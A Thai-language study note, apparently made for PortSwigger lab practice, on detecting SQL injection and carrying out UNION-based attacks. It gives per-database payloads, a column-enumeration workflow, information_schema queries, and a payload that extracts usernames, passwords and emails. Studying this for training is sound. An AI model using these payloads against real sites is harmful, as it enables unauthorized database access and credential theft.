# 💉 1. SQL Injection พื้นฐาน + UNION-based

## 🔍 วิธีสังเกตช่องโหว่

### URL Parameter ที่รับค่าตรงๆ
```
/filter?category=Gifts
/filter?category=Accessories
/filter?category=Corporate+gifts
```

**สังเกต:** ค่าที่ส่งไปเป็น plain text ไม่มีการ encode พิเศษ → มีโอกาสสูงที่ค่านี้ถูกนำไปใส่ใน query ตรงๆ

### ทดสอบช่องโหว่
ลองใส่ `'` (single quote)
- ถ้าได้ **500 Error** หรือ **SQL Error message** → ✅ มีช่องโหว่
- Example: `https://hack/filter?category=Gifts'1 OR 1'=1`

### Filter ทำงานผ่าน GET Parameter
```html
<a href="/filter?category=Gifts">
<a href="/filter?category=Accessories">
```
→ ไม่ใช่ POST form → **แก้ URL ได้โดยตรง**

---

## 🎯 UNION-based SQL Injection

เทคนิคการโจมตีที่ใช้คำสั่ง `UNION` ของ SQL เพื่อ **ดึงข้อมูลจากตารางอื่น** ออกมาผ่าน query เดิมของเว็บ

### Query Database Version

| Database | Syntax |
|----------|--------|
| Oracle | `SELECT banner FROM v$version` |
| Microsoft | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` หรือ `version()` |

### Payload ตามแต่ละ DB

```sql
-- PostgreSQL
'+UNION+SELECT+version(),NULL--

-- MySQL
'+UNION+SELECT+version(),NULL--+

-- Oracle (ต้องมี FROM v$version)
'+UNION+SELECT+banner,NULL+FROM+v$version--

-- MSSQL
'+UNION+SELECT+@@version,NULL--
```

### Comment Syntax ของแต่ละ DB

| DB | Comment |
|----|---------|
| MySQL | `-- ` หรือ `#` หรือ `--+` |
| PostgreSQL | `--` |
| MSSQL | `--` |
| Oracle | `--` |

> ⚠️ **PostgreSQL** ต้องใช้ pattern `CASE WHEN condition THEN result ELSE result END` เสมอ

---

## 🗄️ information_schema

### ดู Table ทั้งหมด (MySQL, MSSQL)
```sql
SELECT table_name FROM information_schema.tables
```

### ดู Column ของ table
```sql
SELECT column_name FROM information_schema.columns
WHERE table_name = 'users'
```

### ดู Column พร้อม data type
```sql
SELECT column_name, data_type FROM information_schema.columns
WHERE table_name = 'users'
```

### รวมหลาย column เป็น 1 (เวลา visible column มีน้อย)
```sql
-- PostgreSQL
SELECT username || ':' || password FROM users

-- MySQL
SELECT concat(username,':',password) FROM users
```

### จำกัดผลลัพธ์
```sql
SELECT username FROM users LIMIT 1 OFFSET 0   -- row แรก
SELECT username FROM users LIMIT 1 OFFSET 1   -- row สอง
```

---

## 🔥 UNION SELECT — FLOW การโจมตี

> **กฎเหล็ก:** จำนวน column ต้องเท่ากันเสมอ

### 3 ขั้นตอน

1. **หาจำนวน column** → `ORDER BY` (ใช้ Intruder)
2. **หา column ที่ visible** → `UNION SELECT 'a', NULL, NULL...`
3. **ดึงข้อมูลที่ต้องการ** → `UNION SELECT version(), NULL, NULL`

### ขั้นตอน CHECK POSITION

ใส่ `'a'` เพื่อทดสอบแต่ละตำแหน่ง:
```sql
UNION SELECT 'a',NULL,NULL,NULL,NULL--  → ไม่เห็น ❌
UNION SELECT NULL,'a',NULL,NULL,NULL--  → เห็น 'a' ✅
UNION SELECT NULL,NULL,'a',NULL,NULL--  → เห็น 'a' ✅
UNION SELECT NULL,NULL,NULL,'a',NULL--  → ไม่เห็น ❌
UNION SELECT NULL,NULL,NULL,NULL,'a'--  → เห็น 'a' ✅
```

### เอา visible ไปแทน 'a'

```sql
-- PostgreSQL, MySQL
GET /filter?category=Gifts'+UNION+SELECT+version(),NULL,NULL--

-- MySQL, MSSQL
GET /filter?category=Gifts'+UNION+SELECT+@@version,NULL,NULL--

-- Oracle
GET /filter?category=Gifts'+UNION+SELECT+banner,NULL,NULL+FROM+v$version--
```

---

## 📦 ดึงข้อมูลจริง (PostgreSQL ตัวอย่าง)

### แบบปกติ
```sql
'+UNION+SELECT+ชื่อcolumn,ชื่อcolumn+FROM+ชื่อTable--
```

> ⚠️ **กล่องรับตัวเลข** (NULL position) เอาข้อความใส่ไม่ได้ → ระเบิด 500 💥

### ถ้า visible มีแค่ 1 column
รวมข้อมูลหลาย column ด้วย `||`:

```sql
'+UNION+SELECT+NULL,username||'~'||password||'~'||email+FROM+users--
```

**ผลลัพธ์:** `administrator~s3cur3p4ssw0rd~admin@email.com`

### ดู Table ทั้งหมด
```sql
'+UNION+SELECT+NULL,table_name,NULL+FROM+information_schema.tables--
```

## 🔗 ดูเพิ่ม
- [[02-Blind-SQL|Blind SQL Injection]]
- [[03-Oracle|Oracle-specific Payloads]]
- [[04-WAF-Bypass|WAF Bypass Techniques]]

#sql-injection #union #portswigger
